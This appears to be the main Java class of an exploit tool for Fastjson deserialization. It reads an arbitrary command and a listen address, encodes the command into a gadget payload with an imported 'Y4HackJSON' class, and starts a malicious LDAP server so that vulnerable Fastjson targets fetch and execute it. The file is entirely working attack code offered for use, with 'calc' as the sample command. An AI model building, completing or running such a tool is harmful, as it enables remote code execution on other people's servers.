import LdapServer.ldap_server;
import Uniti.Y4HackJSON;
import picocli.CommandLine;
import picocli.CommandLine.Command;
import picocli.CommandLine.Option;

@Command(description = "Example: java -jar Ldap_Fastjson-1.0.jar -C \"calc\" -A \"0.0.0.0\"",
        name = "Ldap_Fastjson_Gadget.jar",
        mixinStandardHelpOptions = true,
        version = "1.0.0")
public class Main implements Runnable {

    @Option(names = {"-C"}, description = "command")
    private String command;

    @Option(names = {"-A"}, description = "address")
    private String address;
    @Override
    public void run() {
        if (command == null && address == null) {
            // 如果没有参数传递给应用程序，则显示帮助信息
            CommandLine.usage(this, System.out);
            return;
        }
        if(address == null){
            address = "0.0.0.0";
        }
        System.out.println("[ADDRESS] >> "+address);
        System.out.println("[COMMAND] >> "+command);

        Y4HackJSON y4HackJSON = new Y4HackJSON();
        try {
            ldap_server.setBase64Code(y4HackJSON.Jsoncode(command));
        } catch (Exception e) {
            e.printStackTrace();
        }
        ldap_server.setIP(address);
        ldap_server.server();
    }


    public static void main(String[] args) {
        new CommandLine(new Main()).execute(args);
    }

}
